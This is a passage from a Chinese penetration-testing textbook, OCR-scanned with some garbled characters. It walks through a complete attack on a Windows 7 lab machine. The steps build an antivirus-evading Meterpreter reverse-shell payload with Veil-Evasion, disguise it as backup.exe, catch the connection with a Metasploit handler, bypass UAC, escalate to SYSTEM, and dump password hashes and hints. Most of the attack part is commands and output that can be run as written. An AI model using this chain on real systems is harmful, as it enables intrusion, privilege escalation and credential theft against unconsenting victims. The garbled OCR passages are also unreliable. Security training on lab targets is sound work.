] Please enter a command:
从以上信息中可以看到在Veil下，有24个攻击载荷可加载，并列出了可用的命令。
现在就可以进行各种操作了。例如查看可加载的攻击模块，执行命令如下所示：
[>] Please enter a command: list
Veil-Evasion I [Version]: 2.4.3
[Web]:https://www.veil-framework.com/1[Twitter]:@VeilFramework
[*] Available payloads:
1）
c/meterpreter/rev_tcp
2)
c/meterpreter/rev_tcp_service
3)
c/shellcode_inject/virtual
4)
c/shellcode_inject/void
5)
cs/meterpreter/rev_tcp
6)
cs/shellcode_inject/base64_substitution
7)
cs/shellcode_inject/virtual
8)
native/Hyperion
(6
native/backdoor_factory
10)
native/pe_scrambler
11)
powershell/shellicode_inject/download_virtual
12)
powershell/shellcode_inject/psexec_virtual
13)
powershell/shellcode_inject/virtual
14)
python/meterpreter/rev_http
15)
python/meterpreter/rev_http_contained
16)
python/meterpreter/rev_https
17)
python/meterpreter/rev_https_contained
18)
python/meterpreter/rev_tcp
19)
python/shellcode_inject/aes_encrypt
20)
python/shellcode_inject/arc_encrypt
21)
python/shellcode_inject/base64_substitution
22)
python/shellcode_inject/des_encrypt
23)
python/shellcode_inject/flat
24) python/shellcode_inject/letter_substitution
从输出的信息中，可以看到有24个可用的攻击载荷。此时可以利用任何一个攻击载
荷，进行渗透攻击。
【实例6-5】演示使用Veil工具中的载荷（本例以cs/meterpreter/rev_tcp为例），进行
渗透攻击（这里以Windows7作为攻击靶机）。具体操作步骤如下所示。
（1）启动Veil工具。执行命令如下所示：
root@kali:~# veil-evasion
执行以上命令后，将显示如下所示的信息：
Veil-Evasion I[Version]: 2.4.3
[Web]: https://www.veil-framework.com/1[Twitter]: @VeilFramework
Main Menu
24 payloads loaded
Available commands:
use
use a specific payload
· 195 ·
---
## Page 208
第2篇信息的收集及利用
info
information on a specific payload
list
list available payloads
update
update Veil to the latest version
clean
clean out payload folders
checkvt
check payload hashes vs. VirusTotal
exit
exit Veil
[>] Please enter a command:
在输出的信息中看到[>]Pleaseenteracommand:提示符，就表示Veil登录成功了。
（2）选择cs/meterpreter/rev_tcp攻击载荷。在攻击载荷列表中，cs/meterpreter/rev_tcp
载荷的编号是5。执行命令如下所示：
[>] Please enter a command: use 5
Veil-Evasion I[Version]: 2.4.3
[Web]: https://www.veil-framework.com/1[Twitter]: @VeilFramework
Payload: cs/meterpreter/rev_tcp loaded
Required Options:
Name
Current Value Description
LHOST
IP of the metasploit handler
LPORT
4444
Port of the metasploit handler
compile_to_exe
Y
Compile to an executable
Available commands:
set
set a specific option value
info
show information about the payload
generate
generate payload
back
go to the main menu
exit
exit Veil
[>] Please enter a command:
输出信息显示了rev_tcp攻击载荷可配置的选项参数。这里默认指定的本地端口
（LPORT）是4444，LHOST选项还没有配置。
（3）配置LHOST选项参数，并查看攻击载荷的详细信息。执行命令如下所示：
[>]Please entera command:set LHOST 192.168.6.103
[>] Please enter a command: info
Veil-Evasion I [Version]: 2.4.3
[Web]:https://www.veil-framework.com/1[Twitter]:@VeilFramework
Payload information:
Name:
cs/meterpreter/rev_tcp
Language:
Rating:
CS
Excellent
Description:
pure windows/meterpreter/reverse_tcp stager, no
shellcode
Required Options:
Name
Current Value
Description
LHOST
192.168.6.100 IP of the metasploit handler
LPORT
4444
Port of the metasploit handler
compile_to_exe
Y
Compile to an executable
从输出的信息中，可以看到rev_tcp攻击载荷的详细信息，如攻击载荷名、语言、级
别及配置的选项参数等。
· 196 ·
---
## Page 209
第6章漏润利用
（4）此时，使用generate命令生成载荷文件。执行命令如下所示：
[>] Please enter a command: generate
Veil-Evasion I [Version]: 2.4.3
[Web]: https:/www.veil-framework.com/ 1 [Twitter]: @VeilFramework
[*] Press [enter] for 'payload’
[>] Please enter the base name for output files: backup
#指定输出文件名
在以上命令中指定一个文件名为backup。然后按下回车键，将显示如下所示的信息：
[] Executable written to: /root/veil-output/compiled/backup.exe
Language:
CS
Payload:
cs/meterpreter/rev_tcp
Required Options:
LHOST=192.168.6.103 LPORT=4444compile_to_exe=Y
Payload File:
/root/veil-output/source/backup.cs
Handler File:
/root/veil-output/handlers/backup_handler.rc
[*] Your payload files have been generated, don't get caught!
 [] And don't submit samples to any online scanner! ;)
[>] press any key to return to the main menu:
从输出的信息中可以看到生成一个可执行文件backup.exe，并且该文件保存在
/root/veil-output/compiled/中。此时将可执行文件backup.exe发送到目标主机上，就可以利
用该攻击载荷了。
接下来需要使用Metasploit创建一个远程处理器，等待目标主机连接到KaliLinux（攻
击主机）操作系统。连接成功后，就获取到一个远程ShelL命令
【实例6-6】创建远程处理器。具体操作步骤如下所示
（1）启动MSF终端。
（2）使用handler模块。执行命令如下所示：
msf > use exploit/multi/handler
（3）加载reversetcp攻击载荷，并设置其选项参数。执行命令如下所示：
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.6.103
LHOST => 192.168.6.103
（4）启动渗透攻击。执行命令如下所示：
msf exploit(handler) > exploit
[] Started reverse handler on 192.168.6.103:4444
[*] Starting the payload handler...
从输出信息可以看到攻击载荷已启动，正在等待连接目标主机。
此时将前面生成的可执行文件backup.exe发送到目标主机（Windows7），并运行该
可执行文件。然后返回到KaliLinux操作系统，将看到如下所示的信息：
[*] Sending stage (769536 bytes) to 192.168.6.110
10:44:47 +0800
meterpreter>
从以上信息中，可以看到成功打开了一个Meterpreter会话。这表示已成功渗透攻击目
• 197 *
---
## Page 210
第2篇信息的收集及利用
标主机，现在就可以进行一些Shell命令。如进行目标主机的Shell环境，执行命令如下
所示：
meterpreter > shell
Process 1544 created.
Channel 1 created.
Microsoft Windows [口汾6.1.7601]
□□□□□□（c)20o9 Microsoft Corporation□□□□□□□□□□
C:\Users\lywDesktop>
输出的信息表示进入了目标系统Windows7的命令行，并且当前目标系统登录的用户
是lyw。
如果以上用户没有太高权限时，可以使用Metasploit中的bypassuac模块绕过UAC（用
户访问控制），进而提升用户的权限。下面将介绍使用bypassuac模块提升以上lyw用户
的权限。
（1）将Meterpreter会话，调用到后台运行。执行命令如下所示：
meterpreter > background
[*] Backgrounding session 1..
从输出的信息中，可以看到当前后台运行的会话编号是1。该会话编号需要记住，在
后面将会用到。
（2）查看会话详细信息。执行命令如下所示：
msf exploit(handler) > sessions
Active sessions
PI
Type
Information
Connection
**
7
meterpreter
x86/win32
WIN-RKPKQFBLG6CIbob@WIN-RKPKQFBLG6C
192.168.6.103:4444 -> 192.168.6.106:49199 (192.168.6.106)
从输出信息中可以看到该会话中，连接到目标系统的运行架构、计算机名及IP地址。
（3）使用bypassuac模块，并查看可配置的选项参数。执行命令如下所示：
msf exploit(handler) > use exploit/windows/local/bypassuac
msf exploit(bypassuac) > show options
Module options (exploit/windows/local/bypassuac):
Name
Current Setting Required
Description
SESSION
yes
The session to run this module on
Payload options (windows/meterpreter/reverse_tcp):
Name
Current Setting
Required
Description
EXITFUNC
process
yes
Exit technique (accepted: seh, thread, process,
none)
LHOST
192.168.6.103
yes
The listen address
LPORT
4444
yes
The listen port
Exploit target:
Id Name
0Windows x86
从输出信息中，可以看到模块选项中有一个可配置的选项参数SESSION。该选项的值，
就是当前后台运行的会话编号，
（4）设置SESSION选项参数。如下所示：
· 198 ·
---
## Page 211
第6章漏润利用
msf exploit(bypassuac) > set session 1
session => 1
（5）启动渗透攻击。执行命令如下所示：
msf exploit(bypassuac)> exploit
[*] Started reverse handler on 192.168.6.103:4444
[*] UAC is Enabled, checking level...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing..
[+] Part of Administrators group! Continuing..
[*] Uploaded the agent to the filesystem...
[*] Uploading the bypass UAC executable to the filesystem..
[+] Meterpreter stager executable 73802 bytes long being uploaded..
[] Sending stage (769536 bytes) to 192.168.6.106
10:15:38 +0800
meterpreter>
从输出的信息中，可以看到目前登录的用户实际上是属于管理组的成员，并且绕过了
UAC创建了一个新的会话。此时就可以提升用户的权限了。
（6）查看lyw用户的信息。执行命令如下所示：
meterpreter > getuid
Server usemame:WIN-RKPKQFBLG6CVyw
从输出信息中可以看到该用户只是WIN-RKPKQFBLG6C计算机中的一个普通用户。
（7）提升lyw用户的权限，并查看其用户信息执行命令如下所示：
meterpreter > getsystem
...got system (via technique 1).
meterpreter > getuid
Serverusermame: NT AUTHORITYISYSTEM
从输出信息中可以看到当前lyw用户，拥有了系统级别的权限。此时，可以进行任何
的操作。如捕获目标系统中，用户的密码哈希值。执行命令如下所示：
meterpreter > run post/windows/gather/hashdump
[*] Obtaining the boot key...
[*]Calculating the hboot key using SYSKEY 88f6c818af614f7033cb885 74907b61c...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[+] Dumping password hints...
Test:"www.123*
abc:“123456"
alice:“passwd"
[] Dumping password hashes..
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
O:.:
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0.::
bob:1001:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
从输出的信息中，可以看到目标系统中有三个用户，并且可以看到它们的UID及密码
哈希值。而且，还捕获到三个键盘输入的密码。如捕获的Test用户，其密码为www.123。
· 199 ·
---
## Page 213
第3篇各种渗透测试
M第7章权限提升
第8章密码攻击
M第9章无线网络渗透测试
---
## Page 214
第7章权限提升
权限提升就是将某个用户原来拥有的最低权限提高到最高。通常，我们获得访问的用
户可能拥有最低的权限。但是，如果要进行渗透攻击，可能需要管理员账号的权限，所以
就需要来提升权限。权限提升可以通过使用假冒令牌、本地权限提升和社会工程学等方法
实现。本章将介绍提升用户权限的各种方法。
本章主要知识点如下：
口使用假冒令牌；